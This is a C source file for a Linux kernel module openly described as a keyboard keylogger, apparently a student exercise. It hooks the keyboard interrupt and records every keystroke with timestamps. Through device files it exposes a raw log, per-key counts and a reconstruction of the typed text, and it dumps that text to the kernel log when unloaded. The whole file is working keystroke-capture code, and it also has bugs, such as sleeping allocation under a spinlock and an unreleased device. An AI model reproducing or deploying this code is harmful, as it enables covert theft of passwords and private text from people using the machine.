// SPDX-License-Identifier: GPL-2.0-or-later
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/interrupt.h>
#include <linux/hil.h>
#include <linux/io.h>
#include <linux/slab.h>
#include <linux/fs.h>
#include <linux/miscdevice.h>
#include <linux/time.h>
#include <linux/seq_file.h>
#include <linux/spinlock.h>
#include <linux/workqueue.h>
#include <linux/ctype.h>
#include "keylog.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Sebastien Nicolet <snicolet@student.42.fr>");
MODULE_DESCRIPTION("keyboard keylogger");

DEFINE_SPINLOCK(slock);

static struct key_map		*key_shift_left;
static struct key_map		*key_shift_right;
static struct key_log_index	*key_full_log;
static struct workqueue_struct	*workqueue;

/* -------------------- UTILITY FUNCTIONS SECTION ----------------------------*/

static struct key_log_index	*key_log_create_page(struct key_log_index *next)
{
	struct key_log_index	*idx;
	size_t			blocks;

	idx = kmalloc(LOG_PAGE_SIZE, GFP_KERNEL);
	if (!idx)
		return NULL;
	blocks = (LOG_PAGE_SIZE - (sizeof(struct key_log_index))) /
		 sizeof(struct key_log_entry);
	pr_info("created a new page of %lu logs entries", blocks);
	memset(idx, 0, LOG_PAGE_SIZE);
	idx->next = next;
	idx->entries = (void *)((size_t)idx + sizeof(struct key_log_index));
	idx->available = blocks;
	if (next)
		next->prev = idx;
	return idx;
}

static struct key_log_index	*key_log_last(struct key_log_index *lst)
{
	if (!lst)
		return NULL;
	while (lst->next)
		lst = lst->next;
	return lst;
}

static void	key_log_iter(void (*func)(struct key_log_entry *, void *),
			     void *data)
{
	struct key_log_index		*lst;
	size_t				i;

	for (lst = key_log_last(key_full_log); lst; lst = lst->prev) {
		for (i = 0; i < lst->used; i++)
			func(&lst->entries[i], data);
	}
}

/*
 * look into the log for "needle", the log is walked in the reverse
 * order, also to match the target log entry must havent be already linked
 * you you wish to allow already linked item you have to use empty at true
 */

static struct key_log_entry	*key_log_search_key(struct key_map *needle,
						    const bool empty)
{
	struct key_log_entry	*log;
	struct key_log_index	*lst;
	size_t			i;

	for (lst = key_full_log; lst; lst = lst->next) {
		for (i = lst->used; i > 0; i--) {
			log = &lst->entries[i - 1];
			if (log->key == needle && (empty || !log->link))
				return log;
		}
	}
	return NULL;
}

static void		key_log_clean(void)
{
	struct key_log_index	*lst;
	struct key_log_index	*next;

	lst = key_full_log;
	while (lst) {
		next = lst->next;
		memset(lst, 0, LOG_PAGE_SIZE);
		kfree(lst);
		lst = next;
	}
	key_full_log = NULL;
}

static bool		key_ignore_caps(const struct key_map *key)
{
	if (key->scancode >= 2 && key->scancode <= 13)
		return true;
	return false;
}

static struct key_map	*get_key(const unsigned int scancode)
{
	size_t		i;

	for (i = 0; key_table[i].name; i++) {
		if (key_table[i].scancode == scancode)
			return &key_table[i];
	}
	return NULL;
}

static struct key_log_entry *key_create_entry(struct key_map *key,
					      const bool caps)
{
	struct timespec		ts;
	struct key_log_entry	*log;
	struct key_log_index	*page;

	// here we need a new page
	if (!key_full_log || key_full_log->available == 0) {
		page = key_log_create_page(key_full_log);
		if (!page) {
			pr_err("failed to create a new page !\n");
			return NULL;
		}
		key_full_log = page;
	}
	getnstimeofday(&ts);
	log = &key_full_log->entries[key_full_log->used];
	log->jiffies = jiffies;
	log->key = key;
	log->link = (key->pressed) ? NULL : key_log_search_key(key, false);
	if (log->link)
		log->link->link = log;
	log->press_count = key->press_count;
	log->event = (key->pressed) ? PRESS : RELEASE;
	log->upper_case = key_shift_left->pressed | key_shift_right->pressed;
	// in case of caps lock we invert the comportement.
	if (caps && key_ignore_caps(key) == false)
		log->upper_case = !log->upper_case;
	time_to_tm(ts.tv_sec, sys_tz.tz_minuteswest, &log->tm);
	key_full_log->used += 1;
	key_full_log->available -= 1;
	return log;
}

/* ------------------------ MISC DEVICE SECTION ------------------------------*/

static void	key_prepare_show_entry(struct key_log_entry *log, void *ptr)
{
	struct seq_file *seq = ptr;

	seq_printf(seq,
		   "%02d::%02d::%02d -> Key: %-12s (%2u) - %8s - count: %4lu of %4lu (caps: %3s)",
		   log->tm.tm_hour, log->tm.tm_min, log->tm.tm_sec,
		   (log->upper_case) ? log->key->upper_name : log->key->name,
		   log->key->scancode,
		   (log->event == PRESS) ? "pressed" : "released",
		   log->press_count, log->key->press_count,
		   (log->upper_case) ? "yes" : "no");
	if (log->event == RELEASE && log->link)
		seq_printf(seq, " durration: %4lu",
			   log->jiffies - log->link->jiffies);
	seq_putc(seq, '\n');
}

static int	key_prepare_show(struct seq_file *seq, void *ptr)
{
	spin_lock(&slock);
	key_log_iter(key_prepare_show_entry, seq);
	spin_unlock(&slock);
	return 0;
}

static int	open_key(struct inode *node, struct file *file)
{
	file->private_data = NULL;
	return single_open(file, &key_prepare_show, NULL);
}

static const struct file_operations ops = {
	.owner = THIS_MODULE,
	.open = open_key,
	.read = seq_read,
	.release = single_release,
	.llseek = seq_lseek,
};

static struct miscdevice		dev = {
	MISC_DYNAMIC_MINOR,
	MODULE_NAME,
	&ops
};

/* ****************************** BONUS DEVICE ****************************** */

static void		bonus_iterate(struct key_log_entry *log, void *ptr)
{
	struct seq_file		*seq = ptr;
	char			ascii;

	if (log->event != PRESS)
		return;
	ascii = (log->upper_case) ? log->key->ascii_up : log->key->ascii;
	if (ascii == '\b') {
		if (seq->count > 0) {
			seq->count -= 1;
			seq->index -= 1;
		}
	} else if (isprint(ascii) || ascii == '\n')
		seq_putc(seq, ascii);
}

static int		bonus_show(struct seq_file *seq, void *ptr)
{
	key_log_iter(bonus_iterate, seq);
	return 0;
}

static int		bonus_open(struct inode *node, struct file *file)
{
	int			ret;

	file->private_data = NULL;
	spin_lock(&slock);
	ret = single_open(file, bonus_show, NULL);
	spin_unlock(&slock);
	return ret;
}

static const struct file_operations ops_bonus = {
	.owner = THIS_MODULE,
	.open = bonus_open,
	.read = seq_read,
	.llseek = seq_lseek,
	.release = single_release
};

static struct miscdevice		dev_bonus = {
	MISC_DYNAMIC_MINOR,
	KEY_BONUS_DEVICE,
	&ops_bonus
};

/* ------------------------ KEY STATS DEVICE -------------------------------- */

static size_t		key_total_presss(void)
{
	size_t		i;
	size_t		count;

	count = 0;
	for (i = 0; key_table[i].name; i++)
		count += key_table[i].press_count;
	return count;
}

static int		key_stats_show(struct seq_file *seq, void *ptr)
{
	const struct key_map	*key;
	const size_t		total_press = key_total_presss();
	float			pct;
	size_t			j;

	key = &key_table[0];
	while (key->name) {
		for (j = 0; j < 4; j++) {
			key++;
			if (!key->name)
				break;
			pct = (float)key->press_count / total_press;
			seq_printf(seq, "%s %3ld", key->name, key->press_count);
		}
		seq_putc(seq, '\n');
	}
	return 0;
}

static int		stats_open(struct inode *node, struct file *file)
{
	int		ret;

	spin_lock(&slock);
	ret = single_open(file, key_stats_show, NULL);
	spin_unlock(&slock);
	return ret;
}

static const struct file_operations ops_stats = {
	.owner = THIS_MODULE,
	.open = stats_open,
	.read = seq_read,
	.release = single_release,
	.llseek = seq_lseek
};

static struct miscdevice		dev_stats = {
	MISC_DYNAMIC_MINOR,
	"keylog_stats",
	&ops_stats
};

/* ----------------------- IRQ HANDLER SECTION -------------------------------*/

static void		key_job(struct work_struct *work)
{
	struct key_task		*task = (struct key_task *)work;
	struct key_map		*key;
	unsigned int		scancode = task->scancode;

	spin_lock(&slock);
	key = get_key(scancode & 0x7f);
	if (key) {
		key->pressed = (scancode & 0x80) == 0;
		if (key->pressed)
			key->press_count += 1;
		key_create_entry(key, task->caps_lock);
	} else {
		pr_info("(scan: %3u : %3u) -> %s\n", scancode, scancode & 0x7f,
			((scancode & 0x80) == 0 ? "pressed" : "released"));
	}
	spin_unlock(&slock);
	kfree(task);
}

static irqreturn_t	key_handler(int irq, void *dev_id)
{
	struct key_task			*task;
	static bool			caps_lock;

	task = kmalloc(sizeof(*task), GFP_ATOMIC);
	if (task) {
		task->scancode = inb(0x60);
		if (task->scancode == SCANCODE_CAPS)
			caps_lock = !caps_lock;
		task->caps_lock = caps_lock;
		INIT_WORK(&task->task, key_job);
		queue_work(workqueue, &task->task);
	} else
		pr_err("failed to allocate memory");
	return IRQ_HANDLED;
}

static void	key_logprint_smart(struct key_log_entry *log, void *ptr)
{
	char		ascii;

	if (log->event != PRESS)
		return;
	ascii = (log->upper_case) ? log->key->ascii_up : log->key->ascii;
	if (isprint(ascii) || log->key->ascii == '\n')
		pr_info(KERN_CONT "%c", ascii);
}

static int		cleanner(const size_t flags, const int retval)
{
	if (flags & KFLAG_DEV) {
		pr_info("unregistering device.\n");
		misc_deregister(&dev);
	}
	if (flags & KFLAG_DEVBONUS) {
		pr_info("unregistering bonus device.\n");
		misc_deregister(&dev_bonus);
	}
	if (flags & KFLAG_DEVSTATS)
		misc_deregister(&dev_stats);
	if (flags & KFLAG_IRQ) {
		pr_info("releasing irq.\n");
		free_irq(KEYBOARD_IRQ, &key_handler);
	}
	if (workqueue) {
		pr_info("deleting workqueue\n");
		flush_workqueue(workqueue);
		destroy_workqueue(workqueue);
	}
	return retval;
}

static void		__exit keylogger_clean(void)
{
	pr_info(MODULE_NAME "Cleaning up module.\n");
	cleanner(KFLAG_DEV | KFLAG_DEVBONUS | KFLAG_IRQ, 0);
	key_log_iter(&key_logprint_smart, NULL);
	key_log_clean();
	pr_info(MODULE_NAME " removed.\n");
}

static int		__init hello_init(void)
{
	int		ret;

	pr_info(MODULE_NAME "init ! %lu\n", sizeof(struct key_log_entry));
	workqueue = create_workqueue("keylogger");
	if (!workqueue) {
		pr_err("failed to create workqueue.");
		return -ENOMEM;
	}
	key_full_log = NULL;
	key_shift_left = get_key(42);
	key_shift_right = get_key(54);
	ret = request_irq(KEYBOARD_IRQ, &key_handler, IRQF_SHARED, MODULE_NAME,
			  &key_handler);
	if (ret < 0) {
		pr_err("failed to request keyboard irq: %d\n", ret);
		return cleanner(KFLAG_NONE, -ENOMEM);
	}
	ret = misc_register(&dev);
	if (ret < 0) {
		pr_err("failed to register device.\n");
		return cleanner(KFLAG_IRQ, ret);
	}
	ret = misc_register(&dev_bonus);
	if (ret < 0) {
		pr_err("failed to register bonus device\n");
		return cleanner(KFLAG_IRQ | KFLAG_DEV, ret);
	}
	ret = misc_register(&dev_stats);
	if (ret < 0) {
		pr_err("failed to register stats device.\n");
		return cleanner(KFLAG_IRQ | KFLAG_DEV | KFLAG_DEVBONUS, ret);
	}
	return 0;
}

module_init(hello_init);
module_exit(keylogger_clean);
